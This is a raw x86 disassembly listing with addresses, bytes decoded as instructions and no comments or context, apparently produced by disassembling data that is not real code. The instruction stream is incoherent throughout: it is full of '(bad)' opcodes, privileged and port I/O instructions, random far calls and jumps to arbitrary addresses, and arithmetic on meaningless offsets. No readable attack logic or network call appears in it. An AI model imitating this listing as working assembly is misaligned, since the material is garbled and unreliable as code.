  419535:	rcl    ecx,1
  419537:	mov    ebp,0x701e023f
  41953c:	cmp    dh,BYTE PTR [ecx-0x18a71ccf]
  419542:	div    esp
  419544:	fs iret 
  419546:	retf   0x4524
  419549:	and    edi,edx
  41954b:	sub    edx,DWORD PTR [ecx-0x41]
  41954e:	test   eax,0x76611e9b
  419553:	cmp    BYTE PTR [ecx-0xb7ae0d5],ah
  419559:	out    0x14,al
  41955b:	retf   0x97e1
  41955e:	or     al,0x8b
  419560:	ficomp WORD PTR [esi-0x113b13fa]
  419566:	mov    gs,WORD PTR [ebx+0xe]
  419569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41956a:	or     al,0xf6
  41956c:	icebp  
  41956d:	aas    
  41956e:	adc    ah,BYTE PTR [ebx-0x7ab397fd]
  419574:	iret   
  419575:	jbe    0x419564
  419577:	int    0xa6
  419579:	js     0x419502
  41957b:	sbb    DWORD PTR [edx-0x30dbebb0],0x56
  419582:	mov    bh,0xc4
  419584:	push   edi
  419585:	and    DWORD PTR [eax-0xc508b26],0x267afce5
  41958f:	mov    bh,0x79
  419591:	pop    ebp
  419592:	add    ebx,DWORD PTR ds:0x5e85a6f7
  419598:	mov    edi,0x673fac35
  41959d:	mov    dl,0x4b
  41959f:	in     eax,dx
  4195a0:	sub    BYTE PTR [esi+ecx*2],cl
  4195a3:	scas   al,BYTE PTR es:[edi]
  4195a4:	stc    
  4195a5:	mov    al,0xda
  4195a7:	call   0xae15:0x1d07e6d7
  4195ae:	aaa    
  4195af:	scas   eax,DWORD PTR es:[edi]
  4195b0:	pop    esp
  4195b1:	hlt    
  4195b2:	outs   dx,DWORD PTR ds:[esi]
  4195b3:	push   edi
  4195b4:	push   esi
  4195b5:	enter  0xf806,0x50
  4195b9:	xchg   BYTE PTR [ebx+0x7d668d3e],dh
  4195bf:	iretw  
  4195c1:	(bad)  
  4195c2:	push   esp
  4195c3:	add    al,0xc
  4195c5:	ins    DWORD PTR es:[edi],dx
  4195c6:	cmp    ah,cl
  4195c8:	adc    DWORD PTR [edi+edi*8-0x14f63ba1],0x9df90ba1
  4195d3:	(bad)  
  4195d4:	shr    DWORD PTR [edx+0x40565266],1
  4195da:	inc    eax
  4195db:	add    dl,BYTE PTR [ecx+esi*2]
  4195de:	jne    0x419617
  4195e0:	gs scas al,BYTE PTR es:[edi]
  4195e2:	loope  0x4195dd
  4195e4:	ss xchg ebx,eax
  4195e6:	inc    esi
  4195e7:	pop    es
  4195e8:	(bad)  
  4195e9:	out    dx,eax
  4195ea:	test   ecx,0xb571a101
  4195f0:	mov    bl,0xa2
  4195f2:	call   0xf880a763
  4195f7:	mov    eax,0x8e9c6160
  4195fc:	mov    BYTE PTR [eax],ch
  4195fe:	dec    ebp
  4195ff:	push   ebp
  419600:	mov    ecx,0x79162ea9
  419605:	sti    
  419606:	adc    BYTE PTR [ebx+ebx*4],bl
  419609:	xchg   BYTE PTR [edx],ch
  41960b:	ins    DWORD PTR es:[edi],dx
  41960c:	out    dx,eax
  41960d:	loop   0x41963e
  41960f:	xor    DWORD PTR [eax],eax
  419611:	mov    ds:0x63d49af,eax
  419616:	jp     0x419656
  419618:	test   al,0xff
  41961a:	hlt    
  41961b:	inc    ebp
  41961c:	mul    BYTE PTR [edi+0x754ce6e0]
  419622:	(bad)  
  419623:	mov    al,ds:0xacaf76c2
  419628:	pop    esp
  419629:	xchg   ebp,eax
  41962a:	call   0x27bb:0x55731f85
  419631:	dec    edx
  419632:	inc    ecx
  419633:	in     al,0xe9
  419635:	(bad)  
  419636:	cli    
  419637:	out    0x75,al
  419639:	xchg   eax,edx
  41963b:	sbb    eax,DWORD PTR [edx-0x66]
  41963e:	sub    bh,BYTE PTR [ecx]
  419640:	stos   BYTE PTR es:[edi],al
  419641:	lds    edi,FWORD PTR [ebp+0x9]
  419644:	mov    ds:0xa04661cd,eax
  419649:	in     al,dx
  41964a:	mov    edx,0x6968097d
  41964f:	push   eax
  419650:	jnp    0x4196a7
  419652:	les    ecx,FWORD PTR [ecx-0x5b]
  419655:	(bad)  
  419656:	aad    0xa4
  419658:	out    0x9c,eax
  41965a:	mov    edi,eax
  41965c:	bound  ecx,QWORD PTR [edi-0x28fb9155]
  419662:	mov    bl,0x2a
  419664:	addr16 jl 0x4195fd
  419667:	jmp    0x4196d8
  419669:	and    al,0xbb
  41966b:	stos   BYTE PTR es:[edi],al
  41966c:	xor    dl,BYTE PTR [ebx+eax*2]
  41966f:	xlat   BYTE PTR ds:[ebx]
  419670:	push   esi
  419671:	inc    ebp
  419672:	pop    ss
  419673:	or     BYTE PTR [esi],cl
  419675:	sub    eax,0x5dc550be
  41967a:	mov    ebx,ds
  41967c:	cmp    DWORD PTR [edx-0x6b],eax
  41967f:	icebp  
  419680:	repz cmc 
  419682:	adc    ebx,DWORD PTR [ebp-0x1]
  419685:	add    DWORD PTR [ecx+0x602e0e28],ebx
  41968b:	in     al,0x65
  41968d:	dec    esi
  41968e:	fucompp 
  419690:	xchg   BYTE PTR [eax+0x630c0981],dh
  419696:	mov    BYTE PTR [eax-0x315596a2],dl
  41969c:	das    
  41969d:	push   es
  41969e:	cmp    al,0x92
  4196a0:	repz adc eax,0x578760b3
  4196a6:	repz pop es
  4196a8:	cmp    ecx,esp
  4196aa:	pop    esi
  4196ab:	es push ebp
  4196ad:	ins    DWORD PTR es:[edi],dx
  4196ae:	add    eax,0x1a3ef467
  4196b3:	xchg   esi,eax
  4196b4:	mov    ebp,0x174bdefe
  4196b9:	push   es
  4196ba:	(bad)  
  4196bb:	push   ebp
  4196bc:	or     eax,0xdcdac8a4
  4196c1:	cmp    al,0x89
  4196c3:	iret   
  4196c4:	and    BYTE PTR [edx+0x25],dh
  4196c7:	stc    
  4196c8:	mov    edx,0xb5e31b3f
  4196cd:	sahf   
  4196ce:	aam    0x53
  4196d0:	add    ebp,ebp
  4196d2:	jae    0x4196a3
  4196d4:	sub    bl,ah
  4196d6:	fcomp  QWORD PTR [eax+eax*2-0x552d83ab]
  4196dd:	mov    dl,dh
  4196df:	jg     0x419693
  4196e1:	jnp    0x4196d4
  4196e3:	ret    
  4196e4:	inc    edi
  4196e5:	push   ebx
  4196e6:	sbb    eax,0xddf4a437
  4196eb:	mov    cs,WORD PTR [eax+0x16613b64]
  4196f1:	jno    0x419769
  4196f3:	scas   eax,DWORD PTR es:[edi]
  4196f4:	adc    ebx,esi
  4196f6:	jp     0x4196e5
  4196f8:	mov    al,0x73
  4196fa:	push   ds
  4196fb:	rol    dl,cl
  4196fd:	mov    bl,cl
  4196ff:	in     al,dx
  419700:	pop    ss
  419701:	push   esp
  419702:	mov    cl,0xb4
  419704:	xchg   DWORD PTR [eax-0x2da1dff8],ebx
  41970a:	mov    al,ds:0x7be397cc
  41970f:	scas   al,BYTE PTR es:[edi]
  419710:	sub    DWORD PTR gs:[edi-0x54],edi
  419714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419715:	pop    edx
  419716:	sub    DWORD PTR [eax],esp
  419718:	sub    BYTE PTR [eax],ch
  41971a:	sti    
  41971b:	lahf   
  41971c:	lea    edx,[ecx+0x52]
  41971f:	jecxz  0x41973b
  419721:	push   0xfffffff0
  419723:	lds    esi,FWORD PTR [esi+0x60eb0acd]
  419729:	push   es
  41972a:	mov    ecx,0x239dce95
  41972f:	mov    dl,0xfd
  419731:	mov    dl,0x59
  419733:	push   ebx
  419734:	hlt    
  419735:	sahf   
  419736:	push   ebp
  419737:	add    ecx,DWORD PTR [ebp-0x6941e73b]
  41973d:	xor    dl,ah
  41973f:	jp     0x419751
  419741:	ds cs call 0xc6e6ff2a
  419748:	xchg   ebx,eax
  419749:	sub    bl,BYTE PTR [eax+0x44f4deb0]
  41974f:	iret   
  419750:	(bad)  
  419751:	push   0x55
  419753:	int3   
  419754:	dec    ecx
  419755:	sbb    BYTE PTR [eax+edx*4],bl
  419758:	int3   
  419759:	xchg   DWORD PTR [eiz*4+0x58b72582],edx
  419760:	es push esi
  419762:	(bad)  
  419764:	test   DWORD PTR [esp+edx*4],esi
  419767:	pop    ebp
  419768:	jns    0x41979b
  41976a:	pop    esi
  41976b:	dec    eax
  41976c:	and    BYTE PTR [esi],ch
  41976e:	repz es sbb ch,dh
  419772:	xchg   ebx,eax
  419773:	(bad)  
  419774:	mov    bh,0x74
  419776:	adc    esi,DWORD PTR ds:0x1f242f8d
  41977c:	adc    dh,BYTE PTR [edx]
  41977e:	mov    cl,0x9d
  419780:	aad    0x63
  419782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419783:	jmp    0x29e4:0x93c48a10
  41978a:	mov    eax,eax
  41978c:	ror    DWORD PTR [ecx],1
  41978e:	mov    ecx,0xc3fd5dbc
  419793:	xchg   edx,eax
  419794:	fs add esp,esi
  419797:	and    BYTE PTR [esi+0x59980469],0x77
  41979e:	jno    0x41977f
  4197a0:	sub    al,0xeb
  4197a3:	jne    0x41981a
  4197a5:	scas   eax,DWORD PTR es:[edi]
  4197a6:	xchg   BYTE PTR [ebx+0x6f7a43e5],cl
  4197ac:	fmul   DWORD PTR ds:0x8df1f4c6
  4197b2:	pusha  
  4197b3:	and    BYTE PTR [ecx-0x5a],bh
  4197b6:	add    al,0xe3
  4197b8:	sti    
  4197b9:	cwde   
  4197ba:	add    bh,ah
  4197bc:	mov    esp,0x613059a4
  4197c1:	mov    al,fs:0xab0f6ffc
  4197c7:	cmp    dh,BYTE PTR [edi-0x53276b68]
  4197cd:	jmp    0xc42b896c
  4197d2:	dec    ebp
  4197d3:	mov    esp,0xc73fcafe
  4197d8:	or     eax,0x524726ea
  4197dd:	dec    esp
  4197de:	inc    ecx
  4197df:	rcl    ah,cl
  4197e1:	clc    
  4197e2:	cmp    BYTE PTR [esi+edi*4+0x15ddf6db],bh
  4197e9:	mov    esp,0xb0ef3eaa
  4197ee:	das    
  4197ef:	mov    ch,0x10
  4197f1:	shl    BYTE PTR [ecx+0x22af821d],1
  4197f7:	jmp    0x4197bd
  4197f9:	xor    eax,0x147d71d5
  4197fe:	(bad)  
  4197ff:	sub    edx,DWORD PTR [ebp+edx*2+0x0]
  419803:	mov    edx,0xcfb599e2
  419808:	pop    ebp
  419809:	aaa    
  41980a:	or     dl,ch
  41980c:	pop    ebp
  41980d:	adc    eax,0xb34a73b7
  419812:	nop
  419813:	mul    BYTE PTR [ebp-0xf1f5c25]
  419819:	jo     0x419870
  41981b:	sbb    al,0x5a
  41981d:	int3   
  41981e:	xor    BYTE PTR [ecx-0x77],0xc5
  419822:	inc    ecx
  419823:	iret   
  419824:	mov    ds:0x2097a30f,eax
  419829:	jbe    0x4197c1
  41982b:	jmp    0xf9a4e9ca
  419830:	test   BYTE PTR [edi],0x61
  419833:	push   esp
  419834:	jmp    0x7eef8fe7
  419839:	mov    ch,0x7a
  41983b:	dec    DWORD PTR [edx]
  41983d:	or     al,0x62
  41983f:	imul   ecx
  419841:	ret    0xacba
  419844:	pushf  
  419845:	pop    es
  419846:	adc    esi,DWORD PTR [edx+eiz*2-0xeb989fe]
  41984d:	jmp    0x4198b5
  41984f:	pop    ebx
  419850:	mov    WORD PTR [ebp-0x6d],ds
  419853:	pop    edi
  419854:	lock xchg ecx,eax
  419856:	adc    ch,BYTE PTR [ecx]
  419858:	jno    0x4197e3
  41985a:	mov    dl,0x6f
  41985c:	jae    0x4198b1
  41985e:	fst    QWORD PTR [esp+edi*2-0x5a06528b]
  419865:	xchg   ecx,eax
  419866:	popf   
  419867:	cli    
  419868:	test   DWORD PTR [edi-0xbaca9f0],ebx
  41986e:	mov    dl,0x62
  419870:	pop    edi
  419871:	xlat   BYTE PTR ds:[ebx]
  419872:	jbe    0x41986b
  419874:	sub    BYTE PTR [ebp-0x6b51211e],cl
  41987a:	pop    edi
  41987b:	shr    BYTE PTR ss:[edx+0x3a],cl
  41987f:	je     0x41982b
  419881:	mov    esi,0x878e2966
  419886:	lea    eax,[ecx-0x61]
  419889:	xchg   ebp,eax
  41988a:	div    esi
  41988c:	jmp    0x92f7e56b
  419891:	add    BYTE PTR [eax+0x4940e718],bh
  419897:	push   cs
  419898:	and    ch,BYTE PTR [ecx+0x43]
  41989b:	rol    DWORD PTR [ecx-0x761a9c9b],0x6
  4198a2:	jmp    DWORD PTR [ecx-0x61]
  4198a5:	push   cs
  4198a6:	shl    cl,1
  4198a8:	cmp    al,0x73
  4198aa:	jl     0x4198b9
  4198ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ad:	cwde   
  4198ae:	into   
  4198af:	in     al,dx
  4198b0:	inc    ecx
  4198b1:	add    ecx,DWORD PTR [ecx]
  4198b3:	gs mov bh,0xe8
  4198b6:	mov    ebp,0xd884ab61
  4198bb:	outs   dx,DWORD PTR ds:[esi]
  4198bc:	fstp   TBYTE PTR ds:0x420da4ea
  4198c2:	sub    eax,0xc6ed0f7e
  4198c7:	or     BYTE PTR [edi+eiz*1+0x41881180],ch
  4198ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198cf:	into   
  4198d0:	iret   
  4198d1:	test   eax,0xfed80433
  4198d6:	ins    DWORD PTR es:[edi],dx
  4198d7:	mov    edi,0x475c2bf6
  4198dc:	test   BYTE PTR [edx],al
  4198de:	test   DWORD PTR [eax+esi*4],ecx
  4198e1:	shl    DWORD PTR [esi-0x3c],0xed
  4198e5:	push   edx
  4198e6:	test   BYTE PTR [eax+0x62],ah
  4198e9:	sbb    dh,dh
  4198eb:	mov    al,0xc8
  4198ed:	cmp    BYTE PTR [ecx],bl
  4198ef:	adc    eax,0x599bbac9
  4198f4:	inc    eax
  4198f5:	adc    ebp,DWORD PTR [esi+0x5caba9db]
  4198fb:	xchg   BYTE PTR [ebp+ecx*1+0x41],ah
  4198ff:	xor    DWORD PTR [edx],edx
  419901:	sahf   
  419902:	(bad)  
  419903:	jns    0x419970
  419905:	rol    ah,0x79
  419908:	in     al,0xf6
  41990a:	sar    DWORD PTR [ebx+0x4f],cl
  41990d:	fcomp  QWORD PTR [ebx-0x7f547d16]
  419913:	cmp    DWORD PTR [edx+0x9],ebx
  419916:	add    eax,0x882a1d1e
  41991b:	ror    DWORD PTR [esi+0x39],cl
  41991e:	cli    
  41991f:	xlat   BYTE PTR ds:[ebx]
  419920:	push   cs
  419921:	fild   DWORD PTR [ebp-0x1d]
  419924:	add    BYTE PTR [edx+0x60],al
  419927:	mov    BYTE PTR [edi],ch
  419929:	or     ebp,ecx
  41992b:	jp     0x4198f8
  41992d:	in     al,0x2c
  41992f:	mov    eax,ds:0xab60898c
  419934:	mov    bh,0xe2
  419936:	es jnp 0x419909
  419939:	mov    bl,0x8c
  41993b:	fsub   st,st(6)
  41993d:	push   ds
  41993e:	add    al,0x21
  419940:	mov    al,0x96
  419942:	sbb    BYTE PTR [ebx],0x58
  419945:	and    eax,DWORD PTR [ebp-0x80]
  419948:	dec    ecx
  419949:	jno    0x4198fe
  41994b:	lea    eax,[ebx-0x598ff68a]
  419951:	sbb    DWORD PTR [ecx],esp
  419953:	mov    cl,0xc7
  419955:	mov    esp,0x7b3abc2a
  41995a:	mov    eax,ds:0x37dcd59
  41995f:	das    
  419960:	cs sbb al,0x80
  419963:	pop    ss
  419964:	cmp    esi,DWORD PTR [esi+0x74c3495b]
  41996a:	inc    edx
  41996b:	xor    BYTE PTR [edi-0x2a],cl
  41996e:	fcmovnu st,st(1)
  419970:	mov    edi,0xb574d3a6
  419975:	mov    ds:0x65e9a0c6,eax
  41997a:	sbb    BYTE PTR [esi-0x4c],0x17
  41997e:	jnp    0x419966
  419980:	inc    edi
  419981:	add    BYTE PTR [ecx-0x2d882eb9],ch
  419987:	(bad)  
  419989:	adc    esi,edx
  41998b:	not    BYTE PTR [eax]
  41998d:	mov    bh,0x2e
  41998f:	les    ebx,FWORD PTR [esi]
  419991:	(bad)  
  419992:	out    dx,eax
  419993:	dec    ecx
  419994:	lock inc esi
  419996:	cwde   
  419997:	iret   
  419998:	call   FWORD PTR [ebx]
  41999a:	xor    BYTE PTR [edi+eax*1-0x49],dh
  41999e:	aad    0x7a
  4199a0:	sub    ebx,ecx
  4199a2:	xchg   ecx,eax
  4199a3:	push   cs
  4199a4:	xor    al,0x9d
  4199a6:	retf   
  4199a7:	cld    
  4199a8:	push   ecx
  4199a9:	or     ah,BYTE PTR [edi+0x23]
  4199ac:	data16 jno 0x41997a
  4199af:	imul   esi,DWORD PTR [edx-0x416bd41e],0xeb93687f
  4199b9:	pop    esp
  4199ba:	aas    
  4199bb:	xlat   BYTE PTR ds:[ebx]
  4199bc:	xchg   DWORD PTR [ebp+ecx*2-0x3deccdbd],ebx
  4199c3:	adc    eax,esp
  4199c5:	mov    esp,0x62d35707
  4199ca:	ror    BYTE PTR [ebx-0x61],0x8f
  4199ce:	inc    ebx
  4199cf:	mov    esp,DWORD PTR [ebx-0x35]
  4199d2:	shl    DWORD PTR ds:0xce27c96b,0x65
  4199d9:	inc    ebx
  4199da:	jo     0x4199e1
  4199dc:	push   es
  4199dd:	pop    ebx
  4199de:	xchg   DWORD PTR es:[edx+0x46ebdf24],ebx
  4199e5:	cmp    edx,DWORD PTR [eax-0x75]
  4199e8:	nop    edi
  4199eb:	dec    edi
  4199ec:	stos   BYTE PTR es:[edi],al
  4199ed:	pop    edx
  4199ee:	arpl   ax,bx
  4199f0:	add    eax,DWORD PTR [ebp+0x3981e9ac]
  4199f6:	nop
  4199f7:	aaa    
  4199f8:	mov    edx,0x2fef28d6
  4199fd:	mov    DWORD PTR [esi],edi
  4199ff:	adc    esi,ebp
  419a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a02:	leave  
  419a03:	daa    
  419a04:	or     DWORD PTR [edi],esi
  419a06:	repnz mov bl,0x58
  419a09:	jmp    0xb7bf:0x8cd73b90
  419a10:	jp     0x4199a6
  419a12:	lods   eax,DWORD PTR ds:[esi]
  419a13:	scas   al,BYTE PTR es:[edi]
  419a14:	imul   DWORD PTR [eax]
  419a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a17:	data16 jp 0x419a6a
  419a1a:	dec    edi
  419a1b:	hlt    
  419a1c:	dec    eax
  419a1d:	ja     0x419a87
  419a1f:	test   DWORD PTR [esi-0x53cb6118],eax
  419a25:	ds addr16 adc eax,0x6093f2ae
  419a2c:	(bad)  
  419a2d:	call   0x3e3:0xb46fed89
  419a34:	push   0x239e6412
  419a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3b:	out    dx,al
  419a3c:	cmp    eax,0x381ead0f
  419a41:	pusha  
  419a42:	addr16 (bad) 
  419a44:	gs or  al,0x44
  419a47:	ret    0xa766
  419a4a:	sub    al,0x74
  419a4c:	pop    esp
  419a4d:	repz icebp 
  419a4f:	xor    DWORD PTR [ebp+edx*1+0x18406b2f],ebx
  419a56:	in     al,0xbc
  419a58:	mov    al,BYTE PTR [edi]
  419a5a:	push   edi
  419a5b:	jmp    0x9acc:0xbfc2bc16
  419a62:	xor    BYTE PTR [eax-0x5b95d94a],bh
  419a68:	add    dl,ah
  419a6a:	mov    ds:0xcf50acf7,al
  419a6f:	xor    eax,0x6701f6f2
  419a74:	pop    esi
  419a75:	or     al,0x1e
  419a77:	aad    0xac
  419a79:	and    BYTE PTR [eax+ecx*1],al
  419a7c:	and    DWORD PTR [edi+0x5da80d18],ecx
  419a82:	ficom  DWORD PTR [eax-0x6552b41a]
  419a88:	(bad)  
  419a89:	jb     0x419a1e
  419a8b:	dec    ebx
  419a8c:	(bad)  
  419a8d:	mov    esp,0x4f873f2f
  419a92:	sub    ebp,DWORD PTR [edx+0x4ee9851f]
  419a98:	ret    0xb71a
  419a9b:	dec    ecx
  419a9c:	and    al,BYTE PTR [edx-0x7f2cbc93]
  419aa2:	das    
  419aa3:	imul   edx,DWORD PTR [ecx+0x4c],0xffffffbb
  419aa7:	in     eax,dx
  419aa8:	rcr    DWORD PTR [esi+eax*2+0x6ea80522],1
  419aaf:	lods   al,BYTE PTR ds:[esi]
  419ab0:	leave  
  419ab1:	adc    esi,DWORD PTR [edi-0x26668ae1]
  419ab7:	or     eax,0x6044972f
  419abc:	push   esp
  419abd:	jbe    0x419b15
  419abf:	or     dl,ch
  419ac1:	imul   BYTE PTR [edi-0x1b]
  419ac4:	aas    
  419ac5:	dec    esp
  419ac6:	pop    esp
  419ac7:	mov    ds:0xb15996be,al
  419acc:	fwait
  419acd:	inc    eax
  419ace:	(bad)  
  419acf:	in     al,dx
  419ad0:	add    DWORD PTR [esi-0x48],eax
  419ad3:	std    
  419ad4:	(bad)
  419ad8:	adc    al,BYTE PTR [bx+di-0x8]
  419adc:	(bad)  
  419add:	(bad)  
  419ade:	fmul   DWORD PTR [edi+0x71b218a8]
  419ae4:	mov    ebx,0x76d1b801
  419ae9:	sub    eax,0x3f166fa2
  419aee:	or     edx,DWORD PTR [edi-0x25]
  419af1:	sbb    esi,DWORD PTR [edx-0x38]
  419af4:	mov    ah,0xb0
  419af6:	ins    DWORD PTR es:[edi],dx
  419af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af8:	push   ebx
  419af9:	stc    
  419afa:	xchg   esp,eax
  419afb:	js     0x419aa7
  419afd:	in     al,0xd7
  419aff:	jg     0x419b44
  419b01:	(bad)  
  419b02:	bound  eax,QWORD PTR [ecx-0x72]
  419b05:	hlt    
  419b06:	and    eax,0x50e1da60
  419b0b:	jmp    0x622f90eb
  419b10:	lods   al,BYTE PTR ds:[esi]
  419b11:	xor    esp,DWORD PTR [eax+0x52c902a5]
  419b17:	adc    edx,eax
  419b19:	repz enter 0xf724,0xe1
  419b1e:	stc    
  419b1f:	push   ebx
  419b20:	js     0x419b6a
  419b22:	pop    eax
  419b23:	stc    
  419b24:	aam    0xe2
  419b26:	push   esi
  419b27:	jb     0x419b88
  419b29:	loop   0x419b3f
  419b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b2c:	(bad)  
  419b2d:	cmp    eax,0x450758d1
  419b32:	sub    al,0x61
  419b34:	aaa    
  419b35:	dec    ecx
  419b36:	cmp    esp,ebx
  419b38:	jae    0x419b2f
  419b3a:	inc    edx
  419b3b:	ret    
  419b3c:	dec    ecx
  419b3d:	sbb    al,0x5e
  419b3f:	pop    ebx
  419b40:	sbb    al,0x2c
  419b42:	shr    cl,cl
  419b44:	cld    
  419b45:	fwait
  419b46:	pushf  
  419b47:	sub    al,0xff
  419b49:	xchg   edx,eax
  419b4a:	int3   
  419b4b:	js     0x419b91
  419b4d:	inc    ebp
  419b4e:	xor    eax,0x24a88c45
  419b53:	mov    WORD PTR [edx+ebx*4+0x79],ds
  419b57:	and    BYTE PTR [ecx-0x29d7bd66],0xa4
  419b5e:	pop    ecx
  419b5f:	ds jne 0x419b4f
  419b62:	push   ebp
  419b63:	jbe    0x419afe
  419b65:	mov    dh,BYTE PTR [ebx+0x2f5fe57d]
  419b6b:	js     0x419bd7
  419b6d:	xor    esp,DWORD PTR [esi-0x7ca8b752]
  419b73:	push   0xffffffd0
  419b75:	mov    bh,BYTE PTR [esi]
  419b77:	nop
  419b78:	ds out 0x18,al
  419b7b:	dec    esi
  419b7c:	ins    DWORD PTR es:[edi],dx
  419b7d:	fwait
  419b7e:	mov    ah,BYTE PTR [edi+0x65]
  419b81:	pop    eax
  419b82:	inc    ebp
  419b83:	push   0x1
  419b85:	xchg   edx,eax
  419b86:	aas    
  419b87:	mov    eax,ds:0x357da320
  419b8c:	cmc    
  419b8d:	aas    
  419b8e:	lods   al,BYTE PTR ds:[esi]
  419b8f:	loope  0x419b4e
  419b91:	mov    ds:0x4e488e91,al
  419b96:	(bad)  
  419b97:	pop    ss
  419b98:	add    BYTE PTR [edx-0x3],bh
  419b9b:	scas   eax,DWORD PTR es:[edi]
  419b9c:	xchg   edx,eax
  419b9d:	inc    esp
  419b9e:	inc    esi
  419b9f:	repz out dx,al
  419ba1:	cmp    eax,eax
  419ba3:	pop    edi
  419ba4:	shr    BYTE PTR [esi+0xb61eb35],cl
  419baa:	test   al,0x1d
  419bac:	loop   0x419bea
  419bae:	test   DWORD PTR [edi+eax*4],edi
  419bb1:	call   0x2354:0x53a06e7e
  419bb8:	mov    dl,bl
  419bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbb:	imul   edx,DWORD PTR [ebp+0x1a],0xd97d418c
  419bc2:	inc    esp
  419bc3:	push   es
  419bc4:	mov    esi,0xb132e381
  419bc9:	add    ecx,eax
  419bcb:	inc    esi
  419bcc:	call   0x5de4:0x6593837c
  419bd3:	pop    edi
  419bd4:	cmp    DWORD PTR [edx+0x1e182fa],0xffffffb2
  419bdb:	sar    BYTE PTR [eax+0x5c04ffd9],0x69
  419be2:	push   ebp
  419be3:	sbb    BYTE PTR [edx+0x456ded1c],ch
  419be9:	sbb    edx,DWORD PTR [esi+0x7]
  419bec:	mov    bl,0xbc
  419bee:	mov    ds:0x26823ca7,eax
  419bf3:	mov    ss:0x8a0337bd,al
  419bf9:	push   ss
  419bfa:	push   cs
  419bfb:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  419bfd:	jge    0x419bfc
  419bff:	ret    
  419c00:	les    ebp,FWORD PTR [edx+0x5aced6c3]
  419c06:	ss pop ebp
  419c08:	add    BYTE PTR [ebx-0x74],bl
  419c0b:	push   ebx
  419c0c:	jecxz  0x419bbd
  419c0e:	not    DWORD PTR [edi]
  419c10:	fsubp  st(6),st
  419c12:	inc    esp
  419c13:	cmp    DWORD PTR [ecx],0xf802e54d
  419c19:	shl    cl,cl
  419c1b:	jecxz  0x419c5a
  419c1d:	(bad)  
  419c1f:	add    al,BYTE PTR [esi-0x48]
  419c22:	mov    edx,0x57a0bcea
  419c27:	mov    WORD PTR [edx-0x14],fs
  419c2a:	cmc    
  419c2b:	ins    DWORD PTR es:[edi],dx
  419c2c:	mov    eax,0x7c5fe21c
  419c31:	jbe    0x419bc6
  419c33:	fnstcw WORD PTR [ebp-0x5cf3bd7e]
  419c39:	mov    ebx,0x312f1009
  419c3e:	mov    gs,WORD PTR [ecx]
  419c40:	xchg   edi,eax
  419c41:	mov    cl,0xe4
  419c43:	sub    DWORD PTR [ebx-0x69],0xffffffdb
  419c47:	lahf   
  419c48:	push   ebx
  419c49:	std    
  419c4a:	jl     0x419c7b
  419c4c:	pop    ebp
  419c4d:	cmp    al,0xec
  419c4f:	xlat   BYTE PTR ds:[ebx]
  419c50:	rcl    DWORD PTR [esi-0x73297516],cl
  419c56:	fs es cmp eax,0xed547d50
  419c5d:	call   0xa26d402a
  419c62:	(bad)  [ebx+0x4d]
  419c65:	ins    BYTE PTR es:[edi],dx
  419c66:	pop    ebp
  419c67:	(bad)  
  419c68:	and    eax,0x5f28b9c1
  419c6d:	(bad)  
  419c6e:	push   edi
  419c6f:	add    DWORD PTR [eax+0x44c23af3],eax
  419c75:	mov    eax,0x3f4aed5e
  419c7a:	aas    
  419c7b:	cld    
  419c7c:	mov    eax,0xfb698c10
  419c81:	jecxz  0x419c07
  419c83:	push   ebp
  419c84:	mov    ebx,0xae66b916
  419c89:	inc    ebp
  419c8a:	and    BYTE PTR [ebx+ebp*1-0x37],bl
  419c8e:	jg     0x419c44
  419c90:	sbb    ch,BYTE PTR [ebp+0x69]
  419c93:	and    DWORD PTR [ebx-0x606db922],0xd0f75666
  419c9d:	push   ecx
  419c9e:	jb     0x419c9a
  419ca0:	jle    0x419c77
  419ca2:	pop    ds
  419ca3:	jbe    0x419c7f
  419ca5:	out    0x68,eax
  419ca7:	xor    DWORD PTR [eax-0x29e75c39],0x94a92696
  419cb1:	mov    eax,0x9d191570
  419cb6:	jmp    0x6e10:0x9c746657
  419cbd:	mov    ebx,0x2c118e
  419cc2:	adc    esi,edx
  419cc4:	sub    bl,BYTE PTR [edi+0x24]
  419cc7:	shl    BYTE PTR [ecx+0x5e],0x17
  419ccb:	lods   eax,DWORD PTR ds:[esi]
  419ccc:	cmp    al,0x93
  419cce:	(bad)  
  419ccf:	shl    BYTE PTR [eax-0x5],1
  419cd2:	mov    esp,0xd49e901b
  419cd7:	popa   
  419cd8:	js     0x419cf5
  419cda:	sub    DWORD PTR [ebx+0x28],edx
  419cdd:	ficom  WORD PTR [eax+0x11]
  419ce0:	ins    BYTE PTR es:[edi],dx
  419ce1:	loop   0x419d62
  419ce3:	pop    ds
  419ce4:	xchg   ebx,eax
  419ce5:	jmp    0x5dbb2daf
  419cea:	dec    ebx
  419ceb:	shl    BYTE PTR [esi+0x73ac8b41],1
  419cf1:	mov    ds:0xe2486636,eax
  419cf6:	push   ds
  419cf7:	mov    edx,0x400f9a9c
  419cfc:	ja     0x419c9a
  419cfe:	enter  0x1b50,0xdf
  419d02:	imul   eax,DWORD PTR [edi+0x131aec2a],0x1ba173e8
  419d0c:	imul   DWORD PTR [edx]
  419d0e:	jge    0x419d5d
  419d10:	psllw  mm3,QWORD PTR [eax+0x7d7abac5]
  419d17:	mov    dh,0xd6
  419d19:	jns    0x419d2d
  419d1b:	pop    eax
  419d1c:	jmp    FWORD PTR [edi]
  419d1e:	mov    DWORD PTR [ecx-0x4d],edx
  419d21:	adc    BYTE PTR [ebp+0x40],0x74
  419d25:	mov    edx,0x82098378
  419d2a:	inc    esp
  419d2b:	pop    ebx
  419d2c:	pop    eax
  419d2d:	popf   
  419d2e:	aas    
  419d2f:	out    dx,al
  419d30:	xor    dh,BYTE PTR [ecx-0x16]
  419d33:	mov    ch,0x82
  419d35:	(bad)  
  419d36:	in     al,0xcb
  419d38:	jg     0x419d50
  419d3a:	or     BYTE PTR [ebp-0x351199c8],al
